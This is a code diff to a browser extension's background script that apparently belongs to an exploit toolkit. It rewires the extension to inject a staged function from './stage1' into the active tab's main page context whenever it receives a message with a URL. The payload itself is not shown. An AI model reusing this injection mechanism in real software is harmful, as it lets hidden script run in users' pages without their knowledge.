@@ -1,4 +1,6 @@
-import payloadInjector from './payloadInjector';
+import type { IExploitPayload } from '~lib/exploits/interfaces';
+
+import { f } from './stage1';
 
 async function getCurrentTab() {
 	const queryOptions = { active: true, lastFocusedWindow: true };
@@ -6,21 +8,26 @@ async function getCurrentTab() {
 	return tab;
 }
 
-const inject = async () => {
+const inject = async (url: string) => {
 	const tabId = (await getCurrentTab()).id;
 	if (!tabId) return;
-
-	chrome.scripting.executeScript(
-		{
-			target: {
-				tabId
+	return new Promise((resolve) => {
+		chrome.scripting.executeScript(
+			{
+				target: {
+					tabId
+				},
+				world: 'MAIN', // MAIN in order to access the window object
+				func: f,
+				args: [url]
 			},
-			world: 'MAIN', // MAIN in order to access the window object
-			func: payloadInjector
-		},
-		() => {
-			console.log('Background script got callback after injection');
-		}
-	);
+			resolve
+		);
+	});
 };
-inject();
+
+chrome.runtime.onMessage.addListener(async (data) => {
+	if (data.cmd === 'inject' && data.location) {
+		console.log(await inject(data.location));
+	}
+});
